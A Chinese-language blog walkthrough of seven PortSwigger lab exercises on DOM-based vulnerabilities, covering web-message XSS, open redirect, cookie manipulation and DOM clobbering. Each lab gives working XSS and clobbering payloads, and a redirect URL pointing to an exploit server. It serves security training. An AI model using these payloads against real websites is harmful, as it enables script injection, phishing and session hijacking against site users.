# 原创
：  【burpsuite安全练兵场-客户端15】基于DOM的漏洞-7个实验（全）

# 【burpsuite安全练兵场-客户端15】基于DOM的漏洞-7个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书，华为云、阿里云、51CTO优质博主等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）基于DOM的漏洞（√）
（2）反射型DOM、存储型DOM（√）
（3）控制Web消息源（√）
（4）基于DOM的开放重定向（√）
（5）基于DOM的cookie操作（√）
（6）DOM clobbering（DOM重锤）（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、基于DOM的漏洞](#%E4%B8%80%E3%80%81%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E6%BC%8F%E6%B4%9E)

[1、DOM](#1%E3%80%81DOM)

[2、污染流漏洞](#2%E3%80%81%E6%B1%A1%E6%9F%93%E6%B5%81%E6%BC%8F%E6%B4%9E)

[3、共同来源](#3%E3%80%81%E5%85%B1%E5%90%8C%E6%9D%A5%E6%BA%90)

[4、会导致基于DOM漏洞的汇点](#4%E3%80%81%E4%BC%9A%E5%AF%BC%E8%87%B4%E5%9F%BA%E4%BA%8EDOM%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%B1%87%E7%82%B9)

[5、防止基于DOM的污染流漏洞](#5%E3%80%81%E9%98%B2%E6%AD%A2%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E6%B1%A1%E6%9F%93%E6%B5%81%E6%BC%8F%E6%B4%9E)

[二、反射型DOM、存储型DOM](#%E4%BA%8C%E3%80%81%E5%8F%8D%E5%B0%84%E5%9E%8BDOM%E3%80%81%E5%AD%98%E5%82%A8%E5%9E%8BDOM)

[三、控制Web消息源](#%E4%B8%89%E3%80%81%E6%8E%A7%E5%88%B6Web%E6%B6%88%E6%81%AF%E6%BA%90)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响：](#2%E3%80%81%E5%BD%B1%E5%93%8D%EF%BC%9A)

[3、使用Web消息作为攻击源构建攻击](#3%E3%80%81%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E4%BD%9C%E4%B8%BA%E6%94%BB%E5%87%BB%E6%BA%90%E6%9E%84%E5%BB%BA%E6%94%BB%E5%87%BB)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E7%9A%84DOM%20XSS)[实验1：使用Web消息的DOM XSS](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E7%9A%84DOM%20XSS)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E5%92%8CJavaScript%20URL%E7%9A%84DOM%20XSS)[实验2：使用Web消息和JavaScript URL的DOM XSS](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E5%92%8CJavaScript%20URL%E7%9A%84DOM%20XSS)

[ 4、Origin（原产地）核查](#%C2%A04%E3%80%81Origin%EF%BC%88%E5%8E%9F%E4%BA%A7%E5%9C%B0%EF%BC%89%E6%A0%B8%E6%9F%A5)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ADOM%20XSS%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E5%92%8C%20JSON.parse)[实验3：DOM XSS使用Web消息和 JSON.parse](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ADOM%20XSS%E4%BD%BF%E7%94%A8Web%E6%B6%88%E6%81%AF%E5%92%8C%20JSON.parse)

[四、基于DOM的开放重定向](#%E5%9B%9B%E3%80%81%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91)

[1、简述：](#%C2%A01%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响：](#2%E3%80%81%E5%BD%B1%E5%93%8D%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91)[实验4：基于DOM的开放重定向](#%E5%AE%9E%E9%AA%8C4%EF%BC%9A%E5%9F%BA%E4%BA%8EDOM%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91)

[五、基于DOM的cookie操作](#%E4%BA%94%E3%80%81%E5%9F%BA%E4%BA%8EDOM%E7%9A%84cookie%E6%93%8D%E4%BD%9C)

[1、简述：](#%C2%A01%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响：](#2%E3%80%81%E5%BD%B1%E5%93%8D%EF%BC%9A)

[        ](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%9F%BA%E4%BA%8EDOM%E7%9A%84cookie%E6%93%8D%E4%BD%9C)[实验5：基于DOM的cookie操作](#%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%9F%BA%E4%BA%8EDOM%E7%9A%84cookie%E6%93%8D%E4%BD%9C)

[六、DOM clobbering（DOM重锤）](#%E5%85%AD%E3%80%81DOM%20clobbering%EF%BC%88DOM%E9%87%8D%E9%94%A4%EF%BC%89)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、利用DOM-clobbering漏洞](#2%E3%80%81%E5%88%A9%E7%94%A8DOM-clobbering%E6%BC%8F%E6%B4%9E)

[ ](#%C2%A0%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%88%A9%E7%94%A8DOM%E4%B9%B1%E7%A0%81%E5%AE%9E%E7%8E%B0XSS)[        ](#%C2%A0%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%88%A9%E7%94%A8DOM%E4%B9%B1%E7%A0%81%E5%AE%9E%E7%8E%B0XSS)[实验6：利用DOM乱码实现XSS](#%C2%A0%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%88%A9%E7%94%A8DOM%E4%B9%B1%E7%A0%81%E5%AE%9E%E7%8E%B0XSS)

[3、清除属性绕过](#3%E3%80%81%E6%B8%85%E9%99%A4%E5%B1%9E%E6%80%A7%E7%BB%95%E8%BF%87)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%B8%85%E9%99%A4DOM%E5%B1%9E%E6%80%A7%E4%BB%A5%E7%BB%95%E8%BF%87HTML%E8%BF%87%E6%BB%A4%E5%99%A8)[实验7：清除DOM属性以绕过HTML过滤器](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E6%B8%85%E9%99%A4DOM%E5%B1%9E%E6%80%A7%E4%BB%A5%E7%BB%95%E8%BF%87HTML%E8%BF%87%E6%BB%A4%E5%99%A8)

---


## 一、基于DOM的漏洞

> 
<h3>1、DOM</h3>
文档对象模型（DOM）是Web浏览器对页面上元素的分层表示。网站可以使用JavaScript来操作DOM的节点和对象，以及它们的属性。DOM操作本身并不是问题。事实上，它是现代网站运作的一个组成部分。但不安全地处理数据的JavaScript可能会导致各种攻击。当网站包含JavaScript时，基于DOM的漏洞就会出现，JavaScript获取攻击者可控制的值（称为源），并将其传递到危险的函数（称为接收器）


> 
<h3>2、污染流漏洞</h3>
1、许多基于DOM的漏洞可以追溯到客户端代码处理攻击者可控数据的方式问题。
<hr/>
2、要利用或减轻这些漏洞，首先熟悉源和接收器之间污染流的基本知识是很重要的。 <br/>  
<pre><code>1、来源
源是一个JavaScript属性，它接受可能受攻击者控制的数据。来源的一个示例是location.search属性，因为它从查询字符串读取输入，这对于攻击者来说相对容易控制。最终，任何可以被攻击者控制的属性都是潜在的来源。这包括引用URL（由document.referer字符串公开）、用户的cookie（由document.cookie字符串公开）和Web消息。

2、水槽
接收器是一种具有潜在危险的JavaScript函数或DOM对象，如果将攻击者控制的数据传递给它，可能会导致不良影响。例如，eval（）函数是一个接收器，因为它将传递给它的参数作为JavaScript进行处理。document.body.innerHTML就是HTML接收器的一个示例，因为它可能允许攻击者注入恶意HTML并执行任意JavaScript。
</code></pre>
<hr/>
3、根本上说，当网站将数据从源传递到接收器，然后接收器在客户端会话的上下文中以不安全的方式处理数据时，就会出现基于DOM的漏洞。
最常见的源是URL，通常使用location对象访问它。 location object.攻击者可以构建一个链接，通过URL的查询字符串和片段部分中的有效负载将受害者发送到易受攻击的页面。
<pre><code>如代码：
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}</code></pre>
这很容易受到 基于DOM的开放重定向 因为 location.hash以不安全的方式处理源。如果URL包含以开头的哈希片段 https： ，此代码提取 location.hash 属性并将其设置为location的属性在window中。
<pre><code>攻击者可以通过构造以下URL来攻击此漏洞：
https://www.innocent-website.com/example#https://www.evil-user.net</code></pre>
当受害者访问此URL时，JavaScript将设置 位置 属性到 https://www.evil-user.net ，自动将受害者重定向到恶意站点。例如，可以很容易地利用此行为来构造网络钓鱼攻击。 



---


> 
<h3>3、共同来源</h3>
<pre><code>以下是可用于利用各种污染流漏洞的典型来源：
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database</code></pre>
<hr/>
2、以下类型的数据也可用作利用污染流漏洞的来源：反射数据、存储数据、Web消息


> 
<h3>4、会导致基于DOM漏洞的汇点</h3>

<pre><code>基于DOM的漏洞 	水槽示例
DOM XSS 	    document.write()
打开重定向 	    window.location
Cookie操作 	    document.cookie
JavaScript注入 	eval()
文档域操作 	    document.domain
Web套接字URL中毒 	WebSocket()
链接操作 	    element.src
Web消息处理 	    postMessage()
阿贾克斯请求头操作 	setRequestHeader()
本地文件路径操作 	FileReader.readAsText()
客户端SQL注入 	ExecuteSql()
HTML5-存储操作 	sessionStorage.setItem()
客户端XPath注入 	document.evaluate()
客户端JSON注入 	JSON.parse()
DOM数据处理 	    element.setAttribute()
拒绝服务 	    RegExp() </code></pre>


> 
<h3>5、防止基于DOM的污染流漏洞</h3>
1、简述：无法采取任何单一的操作来完全消除基于DOM的攻击的威胁。但避免基于DOM的漏洞的最有效方法是避免允许来自任何不受信任源的数据动态更改传输到任何接收器的值。
<hr/>
2、防御：如果应用程序所需的功能意味着这种行为是不可避免的，则必须在客户端代码中实现防御措施。在许多情况下，可以在白名单的基础上验证相关数据，只允许已知安全的内容。在其他情况下，则需要对数据进行净化或编码。这可能是一项复杂的任务，并且根据要插入数据的上下文，可能涉及JavaScript转义、HTML编码和URL编码的适当组合。可以采取的防止特定漏洞的措施


## 二、反射型DOM、存储型DOM

> 
 文章：
[【BP靶场portswigger-客户端11】跨站点脚本XSS-20个实验（上）<img alt="" src="https://csdnimg.cn/release/blog_editor_html/release2.2.1/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=MBR7"/>https://blog.csdn.net/qq_53079406/article/details/128649361?spm=1001.2014.3001.5501](https://blog.csdn.net/qq_53079406/article/details/128649361?spm=1001.2014.3001.5501)


---


---


## 三、控制Web消息源

> 
<h3>1、简述：</h3>
1、如果页以不安全的方式处理传入Web消息（如未在事件侦听器中正确验证传入消息的来源），则事件侦听器调用的属性和函数可能会成为接收器。
<hr/>
2、如攻击者可以托管恶意iframe并使用postMessage()方法将Web消息数据传递给有漏洞的事件侦听器，然后该侦听器将有效负载发送给父页面上的接收器。此行为意味着可以使用Web消息作为将恶意数据传播到任何这些接收器的源


> 
<h3>2、影响：</h3>
1、此漏洞的潜在影响取决于目标文档对传入消息的处理。如果目的地文档信任发送者不会在消息中传输恶意数据，并且通过将数据传递到接收器中来以不安全的方式处理数据，则两个文档的联合行为可能允许攻击者危害安全


> 
<h3>3、使用Web消息作为攻击源构建攻击</h3>
<pre><code>示例代码：
&lt;script&gt;
window.addEventListener('message', function(e) {
  eval(e.data);
});
&lt;/script&gt;</code></pre>
这是易受攻击的，因为攻击者可以通过构造以下内容来注入JavaScript负载iframe：
<pre>`&lt;iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')"&gt;`</pre>
由于事件侦听器不验证消息的来源，并且postMessage()方法指定了targetOrigin "*"，因此事件侦听器接受有效负载并将其传递到接收器，在本例中为eval()函数
<hr/>
涉及实验：<br/> 实验1：使用Web消息的DOM XSS<br/> 实验2：使用Web消息和JavaScript URL的DOM XSS


> 
<h3>实验1：使用Web消息的DOM XSS</h3>
信息：
1、本实验演示一个简单的Web消息漏洞
2、完成实验：使用漏洞攻击服务器向目标站点发布一条消息，使其调用print()函数
<hr/>
part1：
主页包含侦听Web消息的addEventListener()调用


转到漏洞利用服务器并将以下iframe添加到正文（添加自己的实验室ID）<br/>    
<pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;

我的是：
&lt;iframe src="https://0a4f00a403524623c3000ce5004900f8.web-security-academy.net/" onload="this.contentWindow.postMessage('&lt;img src=1 onerror=print()&gt;','*')"&gt;</code></pre>
原理：
加载iframe时，postMessage（）方法向主页发送一条Web消息。事件侦听器用于提供广告，它获取Web消息的内容并将其插入ID为ads的div中。但在本例中，它插入img标记，该标记包含无效的src属性。这会抛出一个错误，导致onerror事件处理程序执行我们的有效负载
<hr/>
part2:<br/> 存储漏洞并将其发送给受害者


完成实验



---


> 
<h3>实验2：使用Web消息和JavaScript URL的DOM XSS</h3>
信息：
1、本实验演示一个由Web消息触发的基于DOM的重定向漏洞
2、完成实验：在攻击此漏洞的攻击服务器上构建一个HTML页面并调用print()函数
<hr/>
part1:
主页包含侦听Web消息的addEventListener()调用。JavaScript包含一个有缺陷的indexOf()检查，该检查在Web消息中的任何位置查找字符串"http："或"https："。它还包含sink location.href。



转到漏洞利用服务器并将以下iframe添加到正文中（将YOUR-LAB-ID替换为自己实验室ID）<br/>  
<pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"&gt;

我的是：
&lt;iframe src="https://0a9300b803f84164c13bc20600c100d0.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')"&gt;</code></pre>
原理：
1、此脚本发送包含任意JavaScript有效负载的Web消息以及字符串"http："。第二个参数指定Web消息允许任何targetOrigin。
2、加载iframe时，postMessage()方法将JavaScript有效负载发送到主页。事件侦听器发现"http："字符串，并继续将有效负载发送到location.hrefsink，在这里调用print()函数
<hr/>
part2:<br/> 存储漏洞并将其发送给受害者

 完成实验




---


> 
<h3> 4、Origin（原产地）核查</h3>
1、即使事件侦听器确实包含某种形式的来源验证，这个验证步骤有时也可能存在根本性的缺陷
<pre><code>例如，考虑以下代码：
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') &gt; -1) {
        eval(e.data);
    }
});</code></pre>
1、该 indexOf（索引） 方法用于尝试并验证传入消息的来源是否是 normal-website.com 领域。但实际上，它只检查字符串 " normal-website.com"包含在原始URL中的任何位置。因此如果攻击者的恶意消息的来源是 http://www.normal-website.com.evil.net 
<hr/>
2、相同的缺陷也适用于依赖于 startsWith() 或 endsWith()方法。
<pre><code>例如，下面的事件侦听器将把 http://www.malicious-websitenormal-website.com 作为安全
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});</code></pre>
<hr/>
3、涉及实验：
实验3：DOM XSS使用Web消息和 JSON.parse


---


> 
<h3>实验3：DOM XSS使用Web消息和 JSON.parse</h3>
信息：
1、本实验使用Web消息传递并将消息解析为JSON
2、解决实验：在攻击此漏洞的攻击服务器上构建一个HTML页面，并调用print()函数
<hr/>
part1:
主页包含一个侦听Web消息的事件侦听器。此事件侦听器需要使用JSON.parse()解析的字符串。在JavaScript中，可以看到事件侦听器需要一个type属性，并且switch语句的加载通道大小写更改了iframe src属性



转到漏洞利用服务器并将以下iframe添加到正文中（将YOUR-LAB-ID替换为自己实验室ID）

<pre><code>&lt;iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'&gt;

我的是：
&lt;iframe src=https://0ac700c203e3fab0c2f8bbb5008d002f.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'&gt;</code></pre>

原理：
1、当构造的iframe加载时，postMessage()方法向主页发送一条类型为load-channel的Web消息。事件侦听器接收消息，并在将其发送到交换机之前使用JSON.parse()对其进行解析。
2、开关触发加载通道用例，将消息的url属性分配给ACMEplayer.元素iframe的src属性。但在本例中，消息的url属性实际上包含JavaScript有效负载。
3、由于第二个参数指定Web消息允许任何targetOrigin，并且事件处理程序不包含任何形式的源检查，因此有效负载被设置为ACMEplayer.element iframe的src。当受害者在其浏览器中加载页面时，将调用print()函数。
<hr/>
part2:
存储漏洞并将其发送给受害者


完成实验




---


---


---


## 四、基于DOM的开放重定向

> 
<h3> 1、简述：</h3>
当脚本将攻击者可控制的数据写入可触发跨域导航的接收器时，会出现基于DOM的开放重定向漏洞。
<pre><code>例如，下面的代码由于处理 location.hash属性：
let url = /https?:\/\/.+/.exec(location.hash);
if (url) {
  location = url[0];
}</code></pre>
攻击者可以利用此漏洞构造URL，如果其他用户访问该URL，则会导致重定向到任意外部域。 
<hr/>
<h3>2、影响：</h3>
1、钓鱼：该行为可被利用来促进针对网站用户的网络钓鱼攻击。使用指向正确域的可信应用程序URL和有效TLS证书（如果使用TLS）的能力为网络钓鱼攻击提供了可信度，因为许多用户即使验证了这些功能，也不会注意到随后重定向到不同的域。
<hr/>
2、JavaScript注入：如果攻击者能够控制传递给重定向API的字符串的开头，则可能将此漏洞升级为JavaScript注入攻击。攻击者可以使用javascript:pseudo-protocol构建URL，从而在浏览器处理URL时执行任意代码。 
<hr/>
3、一些接收器会导致基于DOM的开放重定向漏洞
<pre><code>以下是可能导致基于DOM的开放重定向漏洞的一些主要接收器：
location
location.host
location.hostname
location.href
location.pathname
location.search
location.protocol
location.assign()
location.replace()
open()
element.srcdoc
XMLHttpRequest.open()
XMLHttpRequest.send()
jQuery.ajax()
$.ajax()</code></pre>
<hr/>
4、涉及实验：<br/> 实验4：基于DOM的开放重定向


### 2、影响：

---


---


> 
<h3>实验4：基于DOM的开放重定向</h3>
信息：
1、本实验包含一个基于DOM的开放重定向漏洞
2、完成实验：攻击此漏洞并将受害者重定向到攻击服务器
<hr/>
part1:
博客文章页面包含以下链接，该链接可返回博客的主页
<pre><code>&lt;a href='#' onclick='returnURL' = /url=https?:\/\/.+)/.exec(location); if(returnUrl)location.href = returnUrl[1];else location.href = "/"'&gt;Back to Blog&lt;/a&gt;
</code></pre>

<hr/>
 part2:
url参数包含一个开放的重定向漏洞，该漏洞允许更改“返回博客”链接将用户带到的位置。
解决实验：构建并访问以下URL（更改URL以包含自己实验ID和漏洞利用服务器ID）
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&amp;url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/

我的是：
https://0a2400c804958bd0c2396162004a00eb.web-security-academy.net/post?postId=4&amp;url=https://exploit-0ac4000704568b43c2016057014e0016.exploit-server.net/</code></pre>




---


## 五、基于DOM的cookie操作

> 
<h3> 1、简述：</h3>
1、某些基于DOM的漏洞使得攻击者能够操纵通常无法控制的数据。这会将通常安全的数据类型（如Cookie）转换为潜在的源。当脚本将攻击者可控制的数据写入Cookie的值时，就会出现基于DOM的Cookie操作漏洞
<hr/>
2、攻击者可以利用此漏洞构造一个URL，如果其他用户访问该URL，则会在用户的Cookie中设置任意值。许多接收器本身基本上是无害的，但基于DOM的Cookie操纵攻击表明，低严重性漏洞有时可被用作高严重性攻击的利用链的一部分。
<pre><code>例如，如果JavaScript将数据源中的数据写入document.cookie，而不首先对其进行清理，攻击者就可以操纵单个cookie的值以注入任意值：
document.cookie = 'cookieName='+location.hash.slice(1);</code></pre>
如果网站不安全地反映来自cookie的值，而不对它们进行HTML编码，攻击者就可以使用cookie操纵技术来利用此行为
<hr/>
3、一些接收器会导致基于DOM的cookie操作漏洞
<pre>`document.cookie接收器可能导致基于DOM的cookie操作漏洞`</pre>


---


> 
<h3>2、影响：</h3>
1、此漏洞的潜在影响取决于Cookie在网站中所扮演的角色。如果Cookie用于控制某些用户操作（如设置）导致的行为，则攻击者可能能够通过操纵Cookie的值使用户执行意外操作。
<hr/>
2、如果cookie用于跟踪用户的会话，则攻击者可能能够执行会话固定攻击，在该攻击中将cookie的值设置为从网站获得的有效令牌，然后在受害者随后与网站交互期间劫持会话。像这样的cookie操作漏洞不仅可用于攻击易受攻击的网站，还可用于攻击同一父域下的任何其他网站
<hr/>
涉及实验：
实验5：基于DOM的cookie操作


---


> 
<h3>实验5：基于DOM的cookie操作</h3>
信息：
1、本实验演示基于DOM的客户端Cookie操作
2、完成实验：注入一个cookie，它将在不同的页面上导致XSS，并调用print（）函数。您需要使用利用漏洞攻击服务器将受害者引导到正确的页面。
<hr/>
part1:
主页使用名为lastViewedProduct的客户端Cookie，其值是用户访问的最后一个产品页面的URL（第一个产品是跳转到最后一个产品）

 （最后一个产品是跳转到第一个产品）

cookie值与页面的跳转有直接的关联 




转到漏洞利用服务器并将以下iframe添加到正文中（将YOUR-LAB-ID替换为自己实验室ID）
<pre><code>&lt;iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;"&gt;

我的是：
&lt;iframe src="https://0a3a009f03de75bac008456600e30070.web-security-academy.net/product?productId=1&amp;'&gt;&lt;script&gt;print()&lt;/script&gt;" onload="if(!window.x)this.src='https://0a3a009f03de75bac008456600e30070.web-security-academy.net';window.x=1;"&gt;</code></pre>
原理：
iframe的原始源代码与其中一个产品页面的URL匹配，只是在末尾添加了一个JavaScript有效负载。首次加载iframe时，浏览器会临时打开恶意URL，然后将其保存为lastViewedProduct Cookie的值。onload事件处理程序确保受害者立即被重定向到主页，而不知道这种操作曾经发生过。当受害者的浏览器保存了中毒的cookie时，加载主页将导致有效负载执行。
<hr/>
part2:
存储漏洞并将其发送给受害者

完成实验



---


## 六、DOM clobbering（DOM重锤）

> 
<h3>1、简述：</h3>
1、DOM clobbering：是一种将HTML注入页面以操作DOM并最终更改页面上JavaScript行为的技术。DOM clobbering在XSS不可行的情况下特别有用，但是可以控制页面上的某些HTML，在这些页面上，属性id或name被HTML过滤器列入白名单。XSS 是不可能的，但可以在 HTML 过滤器将属性 id 或名称白名单列出的页面上控制一些 HTML 。DOM clobbering最常见的形式是使用锚元素覆盖全局变量，然后应用程序以不安全的方式使用该变量，例如生成动态脚本URL。
<hr/>
2、术语clobbering来自这样一个事实，即您正在“clobbering”对象的全局变量或属性，并用DOM节点或HTML集合覆盖它。如可以使用DOM对象覆盖其他JavaScript对象，并利用不安全的名称（如submit）来干扰表单的实际submit()函数


> 
<h3>2、利用DOM-clobbering漏洞</h3>
1、JavaScript开发人员常用的模式是：
<pre>`var someObject = window.someObject || {};`</pre>
<hr/>
2、如果可以控制页面上的一些HTML，则可以使用DOM节点（如锚点anchor）来重命名someObject引用。使用 DOM 节点(例如锚)的 some 对象引用。
<pre><code>示例代码：
&lt;script&gt;
    window.onload = function(){
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
&lt;/script&gt;</code></pre>
要利用此易受攻击的代码，可以插入以下HTML来攻击 某些对象使用锚元素进行引用：
<pre>`&lt;a id=someObject&gt;&lt;a id=someObject name=url href=//malicious-website.com/evil.js&gt;`</pre>
由于这两个锚点使用相同的ID，DOM将它们组合在一个DOM集合中。然后，DOM clobbering向量将重写 某些对象使用此DOM集合引用。A类 姓名 属性用于最后一个定位点元素，以便清除url的属性someObject对象，该对象指向外部脚本
<hr/>
3、涉及实验：
实验6：利用DOM乱码实现XSS


---


> 
<h3> 实验6：利用DOM乱码实现XSS</h3>
信息：
1、本实验包含DOM攻击漏洞。注释功能允许“安全”HTML
2、完成实验：构造一个HTML注入，该注入会对一个变量进行clobbers，并使用XSS调用alert()函数
<hr/>
part1:
转到其中一篇博客文章并创建包含以下锚点的评论，并返回博客
<pre>`&lt;a id=defaultAvatar&gt;&lt;a id=defaultAvatar name=avatar href="cid:&amp;quot;onerror=alert(1)//"&gt;`</pre>


返回到博客文章并创建包含任意文本的第二条评论，并返回博客
加载该页时，将调用alert

<hr/>

特定博客文章的页面导入JavaScript文件loadCommentsWithDomPurify.js，该文件包含以下代码：
<pre>`let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`</pre>


<pre><code>1、defaultAvatar对象是使用包含逻辑OR运算符和全局变量的危险模式实现的。这使得它很容易受到DOM clobbering

2、可以使用锚标记来clobber这个对象。创建两个具有相同ID的锚点会导致它们被分组到DOM集合中。第二个锚中的name属性包含值“avatar”，这将用href属性的内容来重敲avatar属性

3、该站点使用DOMPurify过滤器来尝试减少基于DOM的漏洞。但DOMPurify允许您使用cid:协议，该协议不对双引号进行URL编码。这意味着可以注入一个编码的双引号，它将在运行时解码。结果，上述注入将导致defaultAvatar变量被分配clobbered属性{avatar: ‘cid:"onerror=alert(1)//’}下次加载该页时

4、当进行第二次发布时，浏览器将使用新的clobbed全局变量，该变量将在onerror事件处理程序中隐藏有效负载并触发alert()</code></pre>



---


> 
<h3>3、清除属性绕过</h3>
1、另一种常见的技术是将form元素与input之类的元素沿着使用，以破坏DOM属性。如通过对attributes属性进行重命名，可以绕过在逻辑中使用该属性的客户端筛选器。尽管过滤器将枚举attributes属性，但它实际上不会删除任何属性，因为该属性已被DOM节点破坏。因此将能够注入通常会被过滤掉的恶意属性。
<pre><code>例如
&lt;form onclick=alert(1)&gt;&lt;input id=attributes&gt;Click me</code></pre>
<hr/>
2、在这种情况下，客户端过滤器将遍历DOM并遇到白名单form元素。通常滤波器将通过attributes的属性form元素并移除任何列入黑名单的属性。但由于attributes财产已经被洗劫一空input元素，则筛选器循环通过input元素。作为input元素具有未定义的长度，则for 滤波器的环路（如 i&lt;element.attributes.length），过滤器简单地移动到下一个元素。这将导致onclick事件被筛选器完全忽略，筛选器随后允许alert()要在浏览器中调用的函数
<hr/>
3、涉及实验：
实验7：清除DOM属性以绕过HTML过滤器


---


> 
<h3>实验7：清除DOM属性以绕过HTML过滤器</h3>
信息：
1、本实验使用HTMLJanitor库，该库容易受到DOM错误的攻击
2、完成实验：构造一个绕过过滤器的向量，并使用DOM clobbering注入一个调用print()函数的向量。需要使用漏洞攻击服务器才能使向量在受害者的浏览器中自动执行。
<hr/>
part1：
转到其中一个博客文章并创建包含以下HTML的评论：
<pre>`&lt;form id=x tabindex=0 onfocus=print()&gt;&lt;input id=attributes&gt;`</pre>




转到漏洞利用服务器并将以下iframe添加到正文
（更改URL以包含自己实验ID，并确保postId参数与在上一步中注入HTML的博客文章的postId匹配）
<pre><code>&lt;iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=8 onload="setTimeout(()=&gt;this.src=this.src+'#x',500)"&gt;

我的是：
&lt;iframe src=https://0ac600710412b7b5c0050b12005c000b.web-security-academy.net/post?postId=8 onload="setTimeout(()=&gt;this.src=this.src+'#x',500)"&gt;</code></pre>
1、库使用attributes属性筛选HTML属性。但仍然有可能破坏attributes属性本身，从而导致长度未定义。这允许向表单元素注入任何所需的属性。在本例中使用onfocus属性来隐藏print()函数。

2、加载iframe时，在500ms延迟后，它会将#x片段添加到页面URL的末尾。为了确保在执行JavaScript之前加载包含注入的注释，延迟是必要的。这会使浏览器关注ID为"x"的元素，这就是在注释内部创建的表单。onfocus事件处理程序随后调用print()函数

<hr/>
part2：
存储漏洞并将其发送给受害者。下次加载页面时，将调用print()函数

发送给受害者，完成实验



---

